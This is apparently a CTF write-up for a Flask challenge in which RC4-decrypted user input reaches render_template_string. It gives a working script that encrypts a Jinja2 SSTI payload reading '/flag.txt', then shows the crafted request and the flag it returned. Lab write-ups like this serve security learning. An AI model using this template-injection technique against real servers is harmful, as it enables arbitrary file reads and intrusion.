![](<./img/Pasted image 20230126100744.png>)

```
/
```

```
Welcome To Find Secret
```

```
/robots.txt
```

```
It is Android ctf
```

![](<./img/Pasted image 20230126103511.png>)

```
/secret
```

```
Tell me your secret.I will encrypt it so others can't see
```

```
/secret?secret=a
```

```
4
```

```
/secret?secret=4
```

```
a
```

```
/secret?secret=hello
```

![](<./img/Pasted image 20230126135545.png>)

```python
if (secret==None):
	return 'Tell me your secret.I will encrypt it so others can\'t see'
rc=rc4_Modified.RC4("HereIsTreasure")   #解密
deS=rc.do_crypt(secret)

a=render_template_string(safe(deS))

if 'ciscn' in a.lower():
	return 'flag detected!'
return a
```

是没有见过的加密方式qaq

[RC4加密法](https://zh.wikipedia.org/zh-cn/RC4)

![](<./img/Pasted image 20230126103403.png>)

对称性好可爱～

```python
from urllib.parse import quote,unquote

s_box = [i for i in range(256)]
key = "HereIsTreasure"
j = 0
for i in range(256):
    j = (j + s_box[i] + ord(key[i % len(key)])) % 256
    s_box[i], s_box[j] = s_box[j], s_box[i]

i = 0
j = 0
content = "{{url_for.__globals__['__builtins__']['open']('/flag.txt').read()}}"
k = ""
for ch in content:
    i = (i + 1) % 256
    j = (j + s_box[i]) % 256
    s_box[i], s_box[j] = s_box[j], s_box[i]
    k += chr(ord(ch) ^ s_box[(s_box[i] + s_box[j]) % 256])
print(quote(k))
```

```
/secret?secret=.%14LG%C2%A68%0Day%C3%93%C3%A7%2C%C2%B9%C2%BE%C3%B9%C2%AA5%C2%9FG%0B%C2%88i%C2%A7M5%C2%93-%C2%80%5E%C3%98%3B%C3%A9%3E%C2%B4r%C2%915%C3%8Ao%C3%ABk%C3%9F%C2%83%C2%A5PF%C3%BAU%C2%A3%C2%B1Gk%2C%C3%BF2x%C3%90v%06%C3%96%C2%BCK%15%C2%BD%C3%9D%04%C2%A7
```

```
'read' is not allowed. Secret is flag{bff8e2e3-a9e1-4574-bb7a-abab391e8b66} 
```

#Web #python #flask #SSTI #rc4